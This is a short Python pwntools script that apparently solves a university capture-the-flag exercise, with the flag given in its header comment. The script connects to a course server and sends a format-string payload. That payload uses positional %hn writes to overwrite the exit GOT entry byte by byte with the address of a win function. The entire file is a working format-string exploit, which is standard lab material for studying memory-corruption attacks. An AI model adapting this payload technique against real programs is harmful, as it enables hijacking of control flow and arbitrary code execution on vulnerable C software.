# SSof{Random_will_not_beat_me}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22197

elf = ELF("bin")
win_address = elf.symbols['win']
exit_address = elf.got['exit']
print(win_address, exit_address)
### run a remote process
s = remote(SERVER, PORT, timeout=3)
# s = process('./check', shell=True)

print(hex(win_address))
goal0 = win_address & 0xff
goal1 = (win_address>>8) & 0xff
goal2 = (win_address>>16) & 0xff
goal3 = (win_address>>24) & 0xff
print(hex(goal0), hex(goal1), hex(goal2), hex(goal3))

### interact with it

print("exit addr:", hex(exit_address))
msg = b""
msg += p32(exit_address)
msg += p32(exit_address+1)
msg += p32(exit_address+2)
msg += p32(exit_address+3)

## first byte
padding = str(goal0-len(msg))
print("Padding: ", hex(int(padding)))
print("Padding: ", padding)

total_output = int(padding) + len(msg)
print(hex(int(total_output)))
msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%7$hn"

## second byte
padding = str((goal1 + 0x100 - total_output)%0x100)
print("Padding: ", hex(int(padding)))
print("Padding: ", padding)


msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%8$hn"
total_output += int(padding)
print(hex(int(total_output)))

## third byte
padding = str((goal2 + 0x100 -total_output)%0x100)
print("Padding: ", hex(int(padding)))
print("Padding: ", padding)


msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%9$hn"
total_output += int(padding)
print(hex(int(total_output)))


## four byte
padding = str((goal3 + 0x100 - total_output)%0x100)
print("Padding: ", hex(int(padding)))
print("Padding: ", padding)


msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%10$hn"
total_output += int(padding)
print(hex(int(total_output)))


print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

# print(s.recv())
# s.recvall()
s.interactive()

